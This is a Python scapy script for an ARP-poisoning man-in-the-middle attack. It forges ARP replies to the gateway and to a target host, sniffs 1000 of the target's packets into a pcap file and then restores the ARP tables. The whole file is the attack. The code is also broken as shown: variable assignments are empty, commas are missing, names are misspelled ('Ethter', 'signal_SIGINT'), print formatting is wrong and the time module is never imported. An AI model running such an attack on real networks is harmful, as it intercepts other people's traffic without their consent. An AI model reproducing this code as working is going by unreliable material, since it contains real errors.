import os
import sys
import threading
import signal
from scapy.all import *

#initialize variables
interface = 
target_ip = 
gateway_ip =
packet_count = 1000


#set interface

conf.iface = interface

#turn off output
conf.verb = 0

def restoreNetw(gateway_ip,gateway_mac,target_ip,target_mac):

	send(ARP(op=2, psrc=gateway_ip, pdst=target_ip\
		hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac),count=5)
	send(ARP(op=2, psrc=target_ip, pdst=gateway_ip\
		hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac),count=5)
	#Signal  main thread to end 
	os.kill(os.getpid(), signal_SIGINT)


def get_mac(ip_addr):
	responses, unanswered = srp(Ethter(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_addr), timeout=2, retry=10)

	for s, r in responses:
		return r[Ether].src
	return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
	poison_target = ARP()
	poison_target.op = 2
	poison_target.psrc = gateway_ip
	poison_target.pdst = target_ip
	poison_target.hwdst = target_mac


	poison_gateway = ARP()
	poison_gateway.op = 2
	poison_gateway.psrc = target_ip
	poison_gateway.pdst = gateway_ip
	poison_gateway.hwdst = gateway_mac

	print "[*] Beginning the ARP poisoning attack now...[CTRL-C to stop]"
	
	while True:
		try:
			send(poison_target)
			send(poison_gateway)
			time.sleep(2)
		except KeyboardInterrupt:
			restoreNetw(gateway_ip, gateway_mac, target_ip, target_mac)

	print "[*]ARP poisoning attack finished[*]" 
	return

print "[*] Setting up %s" %interface

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
	print "[!!!] Failed to get gateway mac. Closing program... "
	sys.exit(0)

else:
	print "Gateway %s is at %s" %gateway_ip, gateway_mac

target_mac = get_mac(target_ip)

if target_mac is None:
	print "[!!!] Failed to get target mac. Closing program... "
	sys.exit(0)
else:
	print "Target %s is at %s" %target_ip, target_mac

#Poisoning Thread
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip,gateway_mac,target_ip,target_mac
	))
poison_thread.start()

try:
	print "[*] Starting sniffing for %d packets" %packet_count
	bpf_filter = "ip host %s" %target_ip

	packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

	#Write captured packets 
	wrpcap('arptest.pcap', packets)

	#Return the network to the original state
	restoreNetw(gateway_ip,gateway_mac,target_ip,target_mac)
except KeyboardInterrupt:
	restoreNetw(gateway_ip,gateway_mac,target_ip,target_mac)
	sys.exit(0)